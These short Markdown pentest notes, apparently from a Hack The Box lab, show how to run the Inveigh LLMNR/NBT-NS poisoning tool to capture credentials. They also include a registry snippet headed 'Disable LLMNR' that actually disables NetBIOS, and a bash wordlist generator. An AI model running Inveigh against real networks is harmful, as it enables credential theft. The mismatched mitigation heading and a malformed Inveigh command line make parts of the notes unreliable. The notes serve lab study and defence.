## <span style="color:yellow">Using Inveigh</span>

Manuale [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help)

```powershell
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
```

```powershell
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```powershell
PS C:\htb> .\Inveigh.exe
```

<mark style="background: #FFB86CA6;">hit the `esc` key to enter the console while Inveigh is running.</mark>


## <span style="color:yellow">Disable LLMNR</span>
```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```


## <span style="color:yellow">Words & Numbers Combinations</span>
```bash
#!/bin/bash

for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
    do echo $x;
done
```


